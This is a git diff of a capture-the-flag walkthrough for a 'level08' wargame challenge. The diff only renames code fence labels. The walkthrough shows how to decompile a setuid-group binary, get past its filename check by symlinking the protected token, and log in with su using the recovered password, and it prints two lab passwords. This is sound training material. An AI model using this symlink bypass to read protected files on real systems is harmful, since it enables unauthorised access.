@@ -6,7 +6,7 @@ level08's password: `fiumuikeil55xe9cu4dood66h`
 
 1. examinate existing files and permissions
 
-```shell
+```bash
 ls -la
 ```
 
@@ -14,7 +14,7 @@ shows that the level08 executable belongs to flag08 group, token is flag08:flag0
 
 2. get the executable (from an external device), decompile it using [retdec](https://github.com/avast/retdec) and examine the resulting code
 
-```shell
+```bash
 scp -P 4242 level08@<host>:level08 .
 retdecomp level08
 ```
@@ -23,19 +23,19 @@ shows that a simple input validation is required to open the file and print its 
 
 4. link a file fullfiling the input validation to the token
 
-```shell
+```bash
 ln -s ~/token /tmp/exploit
 ```
 
 5. pwn the flag
 
-```shell
+```bash
 ./level08 /tmp/exploit
 ```
 
 gives flag08's password: `quif5eloekouj29ke0vouxean`
 
-```shell
+```bash
 su flag08
 quif5eloekouj29ke0vouxean
 getflag
